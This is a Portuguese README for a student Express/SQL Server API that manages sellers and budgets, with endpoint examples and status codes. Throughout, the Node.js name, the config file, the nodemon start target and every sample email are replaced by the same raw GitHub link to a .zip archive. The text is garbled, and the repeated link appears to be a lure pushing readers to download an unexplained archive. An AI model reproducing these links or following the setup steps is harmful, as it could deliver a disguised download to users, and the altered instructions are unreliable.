# 🔌 API de Orçamentos

**Bem-vindo à documentação da API de Orçamentos. Este projeto foi desenvolvido como parte do curso de Desenvolvimento de Sistemas do Senai. O objetivo é gerenciar usuários e orçamentos através de uma API RESTful.**
### 🚀 Tecnologias Utilizadas
 - **https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip** Ambiente de execução JavaScript.
 - **Express:** Framework para gerenciar as rotas e o servidor.
 - **SQL Server:** Banco de dados.
 - **JWT (JSON Web Token):** Para autenticação e segurança.
 ### ⚙️ Como rodar o projeto
 _Siga os passos abaixo para executar a API no seu computador:_

 **1. Pré-requisitos**  
Certifique-se de ter o https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip instalado.

**2. Instalação**
Clone este repositório e instale as dependências:  
```
# Instalar dependências
npm install
```
**3. Configuração do Banco de Dados**   
Certifique-se de que seu banco de dados está rodando e configure as credenciais no arquivo `.env` ou `https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip`   


**4. Executar o servidor**
```
# Rodar com Nodemon (modo desenvolvimento)
npm start
# OU
nodemon https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip
```
O servidor iniciará na porta padrão (geralmente `3000` ou `8081`).

### 📚 Documentação da API (Endpoints)
Aqui estão listadas as principais rotas disponíveis na aplicação, focadas nos controladores de **Auth** e **Usuário**.

#### 🔐 Autenticação (Auth)
`POST /login`  
Realiza o login do usuário e retorna um token de acesso.
- **Body (JSON):**
```
{
  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip",
  "senha": "123"
}
```
- **Resposta (200 OK):**
```
{
  "auth": true,
  "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
}
```

- **Respostas de Erro (401) Unauthorized (Login falhou):**
```
{
  "message": "Login inválido!"
}
```
---
#### 👤 Usuários
`GET /vendedores`
Lista todos os usuários cadastrados no sistema.
- **Resposta (200 OK):**
```
[
  {
    "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
    "nome": "João Silva",
    "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
  },
  {
    "id": "b2c3d4e5-f6a7-8901-2345-678901bcdef0",
    "nome": "Maria Souza",
    "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
  }
]
```

- **Respostas de Erro (401) Unauthorized (Token não enviado):**
```
{
  "auth": false,
  "message": "Nenhum token fornecido."
}
```
---
`GET /vendedor/:id`  
Busca um vendedor específico pelo ID (UUID).
- **Parâmetros de Rota: id (String / UUID)**

- **Resposta (200 OK):**
```
{
  "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef",
  "nome": "João Silva",
  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
}
```

- **Respostas de Erro:**

- 404 Not Found (Usuário não existe):
```
{
  "message": "Usuário não encontrado."
}
```

- 400 Bad Request (ID inválido):
```
{
  "message": "ID fornecido não é um UUID válido."
}
```
---
`POST /registrar/vendedor`  
Cria um novo vendedor no banco de dados.  
**Permissão**: Apenas usuários com perfil de Gerente podem criar novos registros.

- **Body (JSON):**
```
{
  "nome": "Novo Usuário",
  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip",
  "senha": "senhaSegura123"
}
```
- **Resposta (201 Created):**
```
{
  "message": "Usuário criado com sucesso!",
  "id": "a1b2c3d4-e5f6-7890-1234-567890abcdef"
}
```
---
`PUT /vendedor/:id`  
Atualiza os dados de um vendedores existente.
- **Body (JSON):**
```
{
  "nome": "Nome Atualizado",
  "email": "https://github.com/Sanz98/projeto-orcamentos-api/raw/refs/heads/main/src/orcamentos_api_projeto_v2.2.zip"
}
```
- **Resposta (200 OK):**
```
{
  "message": "Usuário atualizado com sucesso."
}
```
---
`DELETE /vendedor/:id`  
Remove um usuário do sistema.
- **Resposta (200 OK):**
```
{
  "message": "Usuário removido com sucesso."
}
```
### 📝 Status Codes

| Código | Descrição | Significado |
| :---: | :--- | :--- |
| **200** | Sucesso | A requisição foi processada com êxito. |
| **201** | Criado | Um novo recurso foi criado com sucesso. |
| **400** | Requisição Inválida | Erro na requisição (dados faltando ou inválidos). |
| **401** | Não Autorizado | Token de autenticação inválido ou não fornecido. |
| **403** | Proibido | O usuário não tem permissão para acessar o recurso. |
| **404** | Não Encontrado | O recurso solicitado não existe. |
| **500** | Erro Interno | Ocorreu um erro inesperado no servidor. |
